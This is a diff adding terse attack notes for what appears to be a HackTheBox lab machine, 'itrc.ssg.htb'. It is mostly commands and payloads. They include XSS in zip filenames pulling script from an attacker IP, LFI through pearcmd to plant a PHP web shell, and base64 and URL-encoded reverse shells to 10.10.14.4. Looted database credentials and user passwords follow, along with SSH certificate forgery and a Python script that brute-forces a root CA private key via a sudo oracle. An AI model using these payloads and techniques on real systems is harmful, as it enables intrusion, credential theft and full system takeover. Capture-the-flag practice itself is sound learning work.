@@ -1,0 +1,129 @@
+└─$ nmap -A 10.10.11.27 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-03 21:38 CEST
+Warning: 10.10.11.27 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.27
+Host is up (0.042s latency).
+Not shown: 63122 closed tcp ports (conn-refused), 2410 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 d54f62397bd222f0a88ad99035605688 (ECDSA)
+|_  256 fb67b06052f2127e6c13fb75f2bb1aca (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://itrc.ssg.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2a683b9906b6c543222ecaf1704bd16 (ECDSA)
+|_  256 0cc39c10f57fd3e4a8286a51ad1ae1bf (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/api                  (Status: 301) [Size: 310] [--> http://itrc.ssg.htb/api/]
+/assets               (Status: 301) [Size: 313] [--> http://itrc.ssg.htb/assets/]
+/server-status        (Status: 403) [Size: 277]
+/uploads              (Status: 301) [Size: 314] [--> http://itrc.ssg.htb/uploads/]
+
+
+https://github.com/EgeBalci/zippo
+
+./zippo -t zip -n '<svg onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//10.10.14.10:4444";d.body.appendChild(z)},0)>.txt -o evil.zip
+./zippo -t zip -n <img src=1 onerror=”setInterval(function(){d=document;z=d.createElement('script');z.src='//10.10.14.10:4444';d.body.appendChild(z)},0)”> 
+-o evil.zip
+
+http://itrc.ssg.htb/?page=admin
+zzinter
+
+http://itrc.ssg.htb/?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuNC80NDQ1IDA+JjEn"));?>+/tmp/hello1.php
+
+ GET /index.php?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?system($_GET['cmd']);?>+/var/www/itrc/uploads/shell.php 
+ http://itrc.ssg.htb/uploads/shell.php?cmd=ls
+ 
+ php -r '$sock=fsockopen("10.10.14.4",8888);exec("/bin/sh <&3 >&3 2>&3");'
+ GET /uploads/shell.php?cmd=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%31%30%2e%31%34%2e%34%22%2c%38%38%38%38%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27 HTTP/1.1
+
+cat db.php
+<?php
+
+$dsn = "mysql:host=db;dbname=resourcecenter;";
+$dbusername = "jj";
+$dbpassword = "ugEG5rR5SG8uPd";
+$pdo = new PDO($dsn, $dbusername, $dbpassword);
+
+╔══════════╣ Users with console
+msainristil:x:1000:1000::/home/msainristil:/bin/bash                                                                                                                 
+root:x:0:0:root:/root:/bin/bash
+support:x:1002:1002:,,,:/home/support:/bin/bash
+zzinter:x:1001:1001::/home/zzinter:/bin/bash
+
+mysql -u jj -p -h resourcecenter
+ugEG5rR5SG8uPd
+
+curl -L http://10.10.14.4/PHP/dashboard1.php -o dashboard1.php
+
+
+cat id_ed25519.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMI916//9yp/9z9HQn1OCxitlWqEYWkLoST6Z+5dNSBs bmcgregor@ssg.htb
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDa1RS3oCZOLoHXlCKYKOBCiaQzNA9weEgvkEyVCr6Wrtlli8clZi5tJkZiRUyRkqrvR6lX3uzEY/OePxDq0/i73bYN2wc60AXn0UFm8WEqfu5fYSao8vZK/Yop80NAXA/x2JHeK74nC8feM9+u004NSjmj5tC8I8C6ywF0ZPu9Bym0RC/Nm8kOGDmrNWqV03owO5XzHBu5u4P1WdL7ge4JAmB0lE7eNv0FJATxQ4hHZghtQvOu3qWUqEbyjzkKrMbKuF2KPIiH3Ep6dWrbKjJ9MIUATJDwNwK6h5x10s/G6aQ8jkPKe0s1SucovFb9b3C/PiYmjlMoAVqoMF8mrQ3NFIsgFFGsJ+pUSMUIkZ/2/EfsPEmA1jfkzEAD18UH1PtXo4GehRAbKw9lcbu1MbQHMGJg+0W/95RxK+wy0NSLuwmycKvpY8MKO9MWP6UMoQmAhYEToulcfwrDGD9ncbzzTd1A951JWkpynGqVKazDIvvrb+MF1XXib2HYZ/7XGQs= mgraham@ssg.htb
+
+
+ {
+                "name": "user",
+                "value": "msainristil"
+              },
+              {
+                "name": "pass",
+                "value": "82yards2closeit"
+
+ssh 10.10.11.27 -l msainristil 
+
+ssh-keygen -t rsa -b 2048 -f keypair
+ssh-keygen -s ca-itrc -I user-cert -n zzinter -V +52w -z 12345 keypair.pub
+ssh -o CertificateFile=keypair-cert.pub -i keypair zzinter@localhost
+
+ssh-keygen -t rsa -b 2048 -f keypair
+ ./sign.sh keypair.pub support support > support.cert
+ ssh -o CertificateFile=support.cert -i keypair support@ssg.htb -p 2222
+ 
+ ./sign.sh keypair.pub zzinter zzinter_temp > zzinter.cert
+ssh -o CertificateFile=zzinter.cert -i keypair zzinter@ssg.htb -p 2222
+
+import string
+import subprocess
+
+header = "-----BEGIN OPENSSH PRIVATE KEY-----"
+footer = "-----END OPENSSH PRIVATE KEY-----"
+b64chars = string.ascii_letters + string.digits + "+/="
+key = []
+lines = 0
+while True:
+    for char in b64chars:
+        with open("unknown.key", "w") as f:
+            f.write(f"{header}\n{''.join(key)}{char}*")
+        proc = subprocess.Popen("sudo /opt/sign_key.sh unknown.key keypair.pub root root_user 1",
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE,
+                                shell=True)
+        stdout, stderr = proc.communicate()
+        if proc.returncode == 1:
+            key.append(char)
+            if len(key) > 1 and (len(key) - lines) % 70 == 0:
+                key.append("\n")
+                lines += 1
+            break
+    else:
+        break
+print(f"{header}\n{''.join(key)}\n{footer}")
+with open("unknown.key", "w") as f:
+    f.write(f"{header}\n{''.join(key)}\n{footer}")
+    
+    ssh-keygen -t rsa -b 2048 -f keypair
+    python cracker.py &
+    tail -f unknown.key
+    
+    ssh-keygen -s root.cert -z 1 -I root -V -1w:forever -n root_user keypair.pub
+    ssh -o CertificateFile=keypair-cert.pub -i keypair root@ssg.htb -p 2222
+
+
